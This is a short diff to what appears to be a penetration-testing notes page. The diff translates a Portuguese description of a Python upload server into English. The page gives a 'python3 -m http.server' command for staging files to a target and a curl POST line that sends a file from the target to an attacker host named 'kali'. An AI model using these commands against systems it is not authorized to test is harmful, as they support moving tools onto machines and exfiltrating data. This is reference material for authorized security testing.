@@ -4,12 +4,12 @@ title: "Upload Server"
 
 # Upload Server
 
-Servidor HTTP Python para transferência de arquivos entre o Kali e o alvo. O servidor serve arquivos via GET e aceita uploads via POST com curl.
+Python HTTP server for file transfer between Kali and the target. Serves files via GET and accepts uploads via POST with curl.
 
 ```shell
-# Servir arquivos (download pelo alvo)
+# Serve files (target downloads)
 python3 -m http.server 80
 
-# Receber arquivo enviado pelo alvo
+# Receive a file sent by the target
 curl -X POST http://kali/upload -F 'files=@file.txt'
 ```
